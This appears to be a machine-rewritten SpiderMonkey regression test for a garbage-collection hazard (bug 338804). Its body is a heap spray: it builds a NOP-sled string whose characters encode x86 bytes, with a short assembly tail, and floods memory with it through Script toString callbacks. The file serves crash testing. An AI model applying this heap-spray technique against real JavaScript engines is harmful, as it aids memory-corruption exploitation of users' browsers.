function f0() {
}
var BUGNUMBER = 338804;
var summary = "GC hazards in constructor functions";
var actual = "No Crash";
var expect = "No Crash";
f0(BUGNUMBER);
f0(summary);
f0("Uses Intel Assembly");
var rooter;
var scale = 2000;
exploit();
function exploit() {
    if (typeof Script == "undefined") {
        f0("Test skipped. Script not defined.");
    } else {
        Script({ toString: fillHeap });
        Script({ toString: fillHeap });
    }
}
function createPayload() {
    var result = "邐";
    var i;
    for ((() => {
            i = 0;
        })();
        i < 9;
        i++) {
        result += result;
    }
    result += "귾觞觃见쳂";
    return result;
}
function fillHeap() {
    rooter = [];
    var payload = createPayload();
    var block = "";
    var s2 = scale * 2;
    var i;
    for ((() => {
            i = 0;
        })();
        i < scale;
        i++) {
        const v55 = block + payload;
        block = v55;
        rooter[i] = v55;
    }
    for (; i < s2; i++) {
        rooter[i] = payload + i;
    }
    return "";
}
f0(expect, actual, summary);
